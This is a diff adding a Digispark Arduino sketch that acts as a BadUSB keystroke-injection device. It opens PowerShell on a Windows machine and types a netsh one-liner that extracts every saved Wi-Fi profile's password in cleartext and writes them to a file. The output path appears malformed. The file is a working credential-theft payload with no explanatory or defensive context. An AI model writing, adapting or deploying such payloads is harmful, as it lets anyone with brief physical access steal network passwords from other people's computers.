@@ -1,0 +1,24 @@
+#include "DigiKeyboard.h"
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+
+  DigiKeyboard.delay (5000);
+
+  DigiKeyboard.sendKeyStroke (0, MOD_GUI_LEFT);
+
+  DigiKeyboard.println ("powershell.exe");
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+  DigiKeyboard.delay (10000);
+
+  DigiKeyboard.println ("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap | Out-File \"$env wireless.txt\"");
+  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay (2000); 
+}
+
+void loop() {
+
+}
